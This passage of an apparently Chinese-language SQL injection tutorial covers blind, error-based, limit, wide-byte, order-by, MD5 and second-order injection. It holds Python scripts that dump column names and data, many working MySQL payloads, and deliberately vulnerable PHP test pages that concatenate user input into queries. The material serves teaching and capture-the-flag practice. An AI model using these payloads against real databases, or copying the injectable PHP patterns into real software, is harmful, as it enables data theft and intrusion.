time</span><br><span class="line">def getColumns(tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">columnname=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">columnname +=char</span><br><span class="line"><span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>0x 爆数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">data=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">data +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="报错注入盲注"><a href="#报错注入盲注" class="headerlink" title="报错注入盲注"></a>报错注入盲注</h2><p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。  </p><p>可参考此文章：<a href="http://www.plasf.cn/articles/spatial_functions_blind_inject.html" target="_blank" rel="noopener">http://www.plasf.cn/articles/spatial_functions_blind_inject.html</a> </p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>0X1 floor()和rand()<br>原理:<a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(<span class="string">':'</span>,(select database()),<span class="string">':'</span>,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</span><br></pre></td></tr></table></figure><p>0X2 ExtractValue(有长度限制,最长32位)<br>原理: <a href="https://www.cnblogs.com/xishaonian/p/6250444.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6250444.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure><p>0X3 UpdateXml(有长度限制,最长32位)<br>原理: <a href="https://www.jb51.net/article/125599.htm" target="_blank" rel="noopener">https://www.jb51.net/article/125599.htm</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure><p>0X4 exp()<br>原理:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and EXP(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure><p>0X5 geometrycollection()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X6 polygon()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X7 multipoint()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X8 multilinestring()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X9 linestring()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X10 multipolygon()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h1 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h1><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>此方法适用于MySQL 5.x中，在limit语句后面的注入<br>详情可看: <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a><br>注入姿势<br>报错注入  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><p>时间注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(<span class="string">"Content-Type: text/plain; charset=utf-8"</span>);</span><br><span class="line">require(<span class="string">"mysql.class.php"</span>);</span><br><span class="line"><span class="variable">$mysql</span> = new MySQL(<span class="string">"test"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="variable">$mysql</span>-&gt;executeSQL(<span class="string">"SELECT * FROM user where uid &lt; 100 ORDER BY uid limit &#123;<span class="variable">$_GET</span>['p']&#125;, 10"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$users</span>)&#123;</span><br><span class="line"><span class="variable">$users</span> = var_export(<span class="variable">$users</span>, TRUE);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$users</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$mysql</span>-&gt;lastError;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>详细可看：<a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a><br>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運<span class="string">'</span></span><br></pre></td></tr></table></figure><p>注入姿势：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%df<span class="string">'order by 1 %23</span></span><br></pre></td></tr></table></figure><p>题目 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = @<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line"><span class="keyword">if</span>( !isset(<span class="variable">$id</span>)|| empty(<span class="variable">$id</span>) )&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="string">'get.id 参数不能为空'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">"mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8"</span>;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    <span class="variable">$user</span> = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    <span class="variable">$psw</span> =<span class="string">'root'</span>; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    <span class="variable">$pdo</span> = new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$psw</span>);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">'select * from tdb_goods where goods_id ='</span>.<span class="string">"'&#123;<span class="variable">$id</span>&#125;'"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$sql</span>) or var_dump(<span class="variable">$pdo</span>-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$mon</span> = <span class="variable">$res</span>-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( <span class="variable">$mon</span> );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h2><p>笛卡尔积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员。</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br></pre></td></tr></table></figure><p>你完全可以按照这个规律，从C后面加个逗号，写D，E等等等，想写多少就写多少，但是写的越多查询的速度就会越慢，如果在表或者列数量很少的情况下，可以写的多一点。</p><p>到浏览器实践一下，发现确实延迟了。</p><h2 id="mysql约束攻击"><a href="#mysql约束攻击" class="headerlink" title="mysql约束攻击"></a>mysql约束攻击</h2><p>详情看：<a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/</a><br>出现在注册用户时，对用户名参数的多余空格没有过滤。利用了在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table user(id int primary key, user varchar(10),<span class="built_in">pwd</span> varchar(20)); //创建一个表</span><br><span class="line">insert into user values(1,<span class="string">'admin'</span>,<span class="string">'123'</span>); //插入数据</span><br><span class="line">insert into user values(2,<span class="string">'admin                                          '</span>,<span class="string">'123'</span>);</span><br><span class="line">select length(user) from user; //查看数据长度</span><br></pre></td></tr></table></figure><h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><p>详细看<a href="http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html</a><br>0x1 利用报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用regexp</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=1,1,0x00)) 正常</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=2,1,0x00))  错误</span><br><span class="line">利用updatexml</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=1,1,user()),1)  正确</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=2,1,user()),1) 错误</span><br><span class="line">利用extractvalue</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=1,1,user())) 正确</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure><p>0x2 基于盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意如果直接<span class="keyword">if</span>(1=2,1,SLEEP(2))，sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击</span><br><span class="line"></span><br><span class="line">/?order=<span class="keyword">if</span>(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) 正常响应时间</span><br><span class="line">/?order=<span class="keyword">if</span>(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) sleep 2秒</span><br></pre></td></tr></table></figure><p>0x3 sqlmap<br>sqlmap测试<br>在没有过滤的情况下是能够检测到注入的</p><p>测试样题<br>index.php </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">mysql_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>) or die(<span class="string">"Database connection failed "</span>);</span><br><span class="line">mysql_select_db(<span class="string">"sqlidemo"</span>) or die(<span class="string">"Select database failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">'order'</span>] ? <span class="variable">$_GET</span>[<span class="string">'order'</span>] : <span class="string">'name'</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select id,name,price from goods order by <span class="variable">$order</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reslist</span> = array();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">  array_push(<span class="variable">$reslist</span>, <span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> json_encode(<span class="variable">$reslist</span>);</span><br></pre></td></tr></table></figure><p>sql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database sqlidemo;</span><br><span class="line">use sqlidemo;</span><br><span class="line">create table goods (id int(4) not null primary key auto_increment, name char(32) not null, price int(4) not null);</span><br><span class="line">insert into goods (name, price)  values(<span class="string">"apple"</span>, 10);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"banana"</span>, 15);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"peach"</span>, 20);</span><br></pre></td></tr></table></figure><h2 id="MD5注入"><a href="#MD5注入" class="headerlink" title="MD5注入"></a>MD5注入</h2><p>详细可看<a href="http://blog.lvguangfa.cn/ctf/135.html" target="_blank" rel="noopener">http://blog.lvguangfa.cn/ctf/135.html</a><br>当php中使用到 md5($str,true) 输出md5值时，二进制被HEXdecode后可能会包含例如’or 1#的字符，从而产生sql注入</p><p>先看php中的md5函数，它有两个参数string和raw。<br>第一个参数string是必需的，规定要计算的字符串。<br>第二个参数raw可选，规定十六进制或二进制输出格式：</p><p>TRUE - 原始 - 16 字符二进制格式<br>FALSE - 默认 - 32 字符十六进制数<br>注入姿势： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=129581926211651571912466741651878684928  //T0Do<span class="comment">#'or'8</span></span><br><span class="line">password=ffifdyop //<span class="string">'or'</span>6]!r,b</span><br></pre></td></tr></table></figure><p>测试题目 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">"'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Failure'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="insert、update和delete报错注入"><a href="#insert、update和delete报错注入" class="headerlink" title="insert、update和delete报错注入"></a>insert、update和delete报错注入</h2><p><a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">传统insert、update和delete报错注入 </a><br><a href="https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/" target="_blank" rel="noopener">新式MySQL Injection in Update, Insert and Delete</a><br>0x1 传统利用方式<br>0x 1.1 insert  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我们用updatexml来演示</span><br><span class="line">使用逻辑运算符（and or xor &amp;&amp; ||）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span> xor updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (5,<span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用算数运算符（+ – * /）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>+updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>*updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用位运算符连接（| &amp;）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>&amp;updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>|updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x1.2 update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users <span class="built_in">set</span> username = <span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span> <span class="built_in">where</span> id = 5;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x1.3 delete</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from users <span class="built_in">where</span> id = 5 or updatexml(2,concat(0x7e,(version())),0) or <span class="string">''</span>;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure><p>0x2 新式利用<br>语句格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p>0x2.1 update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update emails <span class="built_in">set</span> email_id=<span class="string">'osanda'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10) <span class="built_in">where</span> id=<span class="string">'16'</span>;</span><br></pre></td></tr></table></figure><p>0x2.2 Insert</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,<span class="string">'james'</span>, <span class="string">'bond'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10);</span><br></pre></td></tr></table></figure><p>0x2.3 Limitations in MySQL 5.7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ignore users <span class="built_in">set</span> username = <span class="string">'osanda'</span> | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) <span class="built_in">where</span> id=14;</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p> 详细可看此文章:<a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">MySQL注入系列之二次注入(三)</a><br> 测试代码<br> config.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'mysql'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'sqlinject'</span>);</span><br><span class="line">mysql_set_charset(<span class="string">'utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span 